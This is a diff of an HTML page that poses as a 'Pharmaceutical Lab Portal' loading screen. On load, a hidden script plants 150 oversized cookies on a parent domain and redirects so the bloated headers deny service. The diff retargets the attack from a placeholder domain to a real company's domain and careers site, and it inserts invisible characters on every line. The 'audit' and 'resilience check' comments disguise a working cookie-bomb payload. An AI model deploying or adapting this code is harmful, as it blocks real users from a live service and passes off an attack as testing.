@@ -1,42 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Internal Research Document</title>
-</head>
-<body onload="launchAudit()">
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>Loading Pharmaceutical Lab Portal...</h2>
-        <p>Please wait while we verify your session data.</p>
-    </div>
-
-    <script>
-        function launchAudit() {
-            // 1. Identify the target parent domain
-            // For the audit, manually set this to the parent of your targets
-            const targetDomain = ".example-pharma.com"; 
-            const targetPortal = "https://trials.example-pharma.com";
-
-            console.log("🧬 Initializing Infrastructure Resilience Check...");
-
-            try {
-                // 2. The Loop: Generate 600KB of "Nuclear" Cookies
-                // 150 unique cookies * 4KB each = 600KB
-                for (let i = 0; i < 150; i++) {
-                    let payload = "STRESS_TEST_" + "X".repeat(3980) + "_" + i;
-                    
-                    // Bind to Parent Domain for maximum blast radius
-                    document.cookie = `session_id_${i}=${payload}; Domain=${targetDomain}; Path=/; Max-Age=3600; SameSite=Lax`;
-                }
-
-                // 3. Execution: Redirect to trigger the DoS
-                setTimeout(() => {
-                    window.location.href = targetPortal;
-                }, 500);
-
-            } catch (e) {
-                console.error("Audit failed: " + e.message);
-            }
-        }
-    </script>
-</body>
-</html>
+‎<!DOCTYPE html>
+‎<html>
+‎<head>
+‎    <title>Internal Research Document</title>
+‎</head>
+‎<body onload="launchAudit()">
+‎    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+‎        <h2>Loading Pharmaceutical Lab Portal...</h2>
+‎        <p>Please wait while we verify your session data.</p>
+‎    </div>
+‎
+‎    <script>
+‎        function launchAudit() {
+‎            // 1. Identify the target parent domain
+‎            // For the audit, manually set this to the parent of your targets
+‎            const targetDomain = ".airbnb.com"; 
+‎            const targetPortal = "https://careers.airbnb.com";
+‎
+‎            console.log("🧬 Initializing Infrastructure Resilience Check...");
+‎
+‎            try {
+‎                // 2. The Loop: Generate 600KB of "Nuclear" Cookies
+‎                // 150 unique cookies * 4KB each = 600KB
+‎                for (let i = 0; i < 150; i++) {
+‎                    let payload = "STRESS_TEST_" + "X".repeat(3980) + "_" + i;
+‎                    
+‎                    // Bind to Parent Domain for maximum blast radius
+‎                    document.cookie = `session_id_${i}=${payload}; Domain=${targetDomain}; Path=/; Max-Age=3600; SameSite=Lax`;
+‎                }
+‎
+‎                // 3. Execution: Redirect to trigger the DoS
+‎                setTimeout(() => {
+‎                    window.location.href = targetPortal;
+‎                }, 500);
+‎
+‎            } catch (e) {
+‎                console.error("Audit failed: " + e.message);
+‎            }
+‎        }
+‎    </script>
+‎</body>
+‎</html>
+‎
